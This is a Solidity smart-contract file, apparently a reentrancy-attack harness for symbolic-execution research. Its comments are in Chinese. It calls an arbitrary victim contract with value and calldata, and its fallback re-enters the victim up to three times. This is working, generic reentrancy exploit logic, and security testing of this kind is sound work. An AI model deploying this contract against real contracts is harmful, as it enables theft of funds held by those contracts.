// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract AttackBridge{
    uint public counter;
    address public last_caller_addr;
    string public func_sig;
    bytes public call_data1;
    bytes public call_data2;
    bytes public call_data3;
    bytes public call_data4;
    bytes public call_data5;
    string public func_sig_re;
    address public victim_addr;
    address private owner;
    uint private flag;


    constructor(string memory func_sig_) public {
        counter = 0;
        last_caller_addr = address(0);
        func_sig_re = func_sig_;
        owner = msg.sender;
    }
    
    // function set_func_sig(string memory func_sig_) public {
    //     func_sig = func_sig_;
    // }
    // function set_call_addr(address addr_) public {
    //     victim_addr = addr_;
    // }

    // 满足 call 的 地址是符号型的, sig 是符号型的 value 也是符号型的. 
    function attack(uint num_, string memory func_sig_, address addr, bytes memory call_data_1, bytes memory call_data_2,bytes memory call_data_3,bytes memory call_data_4,bytes memory call_data_5) public payable{
        //string n = "transfer(address)";
        func_sig = func_sig_;
        call_data1 = call_data_1;
        call_data2 = call_data_2;
        call_data3 = call_data_3;
        call_data4 = call_data_4;
        call_data5 = call_data_5;
        victim_addr = addr;
        // 开锁
        flag = 1;

        (bool sucess, bytes memory data) = address(victim_addr).call{value: num_}(
            abi.encodeWithSignature(func_sig, call_data1, call_data2, call_data3, call_data4, call_data5) );
        if (!sucess){
            //关锁
            revert();
        }
        //关锁
        flag = 0;
    }

    fallback () external payable {
        // init
        // 咱们做 符号执行的时候 不用 sig_, 只是目前实际测试的时候采用 sig_; 
        // string memory sig_ = "attacked(uint,address)"; 
        if (flag != 1){
            revert();
        }
        if (last_caller_addr == address(0)){
            last_caller_addr = msg.sender;
            counter += 1;
            // 对于 一层 A -> B -> A -B 类型的攻击 我们可以用 msg.sender
            // (bool sucess, bytes memory data) = address(msg.sender).call(
            // abi.encodeWithSignature(func_sig, call_data1, call_data2, call_data3, call_data4, call_data5) );
            // 对于 多层  A -> B -> C -> A -> B -> C 这种 需要符号型(或者 指定的那种) 而不是 sender
            (bool sucess, bytes memory data) = address(victim_addr).call(
            abi.encodeWithSignature(func_sig_re, call_data1, call_data2, call_data3, call_data4, call_data5) );

            if (!sucess){
                revert();
            }
        }
        // reentrancy less than 3 times
        else{ 
            if(last_caller_addr == msg.sender){
            // if(counter!=0){ 上面启用了的条件会导致 只找那些 循环调用同一个合约了的情况, 如果用 counter!=0 还会搜集 不同合约间引发的 reentrancy 情况 更复杂.
                // reentrancy call
                counter += 1;
                if (counter < 3){
                    // (bool sucess, bytes memory data) = address(msg.sender).call(
                    // abi.encodeWithSignature(func_sig, call_data1, call_data2, call_data3, call_data4, call_data5) );
                    (bool sucess, bytes memory data) = address(victim_addr).call(
                    abi.encodeWithSignature(func_sig_re, call_data1, call_data2, call_data3, call_data4, call_data5) );
                    if (!sucess){
                        revert();
                    }
                }
            }
        }
        // 如果不是连续的同一个函数的调用 那么就结束吧
        
        // TX END, 这使得每次 执行 该函数 都会是新的状态值.
        last_caller_addr = address(0);
        counter = 0;
    }
}